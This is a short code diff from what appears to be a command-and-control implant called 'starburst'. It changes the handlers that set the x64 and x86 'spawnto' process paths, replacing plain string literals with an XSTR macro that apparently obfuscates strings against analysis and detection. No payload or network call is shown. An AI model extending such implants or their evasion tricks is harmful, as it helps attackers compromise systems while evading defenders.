@@ -19,7 +19,7 @@ auto declfn starburst::cmd_spawnto_x64(
     auto application = parser_string( params, &app_len );
     if ( !application || app_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no application path" ) ) );
+            XSTR( "no application path" ) );
         return;
     }
 
@@ -38,7 +38,7 @@ auto declfn starburst::cmd_spawnto_x64(
     }
 
     char msg[600] = {};
-    auto prefix = symbol<const char*>( "spawnto_x64 set to: " );
+    auto prefix = XSTR( "spawnto_x64 set to: " );
     uint32_t i = 0;
     while ( prefix[i] && i < 500 ) { msg[i] = prefix[i]; i++; }
     uint32_t j = 0;
@@ -66,7 +66,7 @@ auto declfn starburst::cmd_spawnto_x86(
     auto application = parser_string( params, &app_len );
     if ( !application || app_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no application path" ) ) );
+            XSTR( "no application path" ) );
         return;
     }
 
@@ -85,7 +85,7 @@ auto declfn starburst::cmd_spawnto_x86(
     }
 
     char msg[600] = {};
-    auto prefix = symbol<const char*>( "spawnto_x86 set to: " );
+    auto prefix = XSTR( "spawnto_x86 set to: " );
     uint32_t i = 0;
     while ( prefix[i] && i < 500 ) { msg[i] = prefix[i]; i++; }
     uint32_t j = 0;
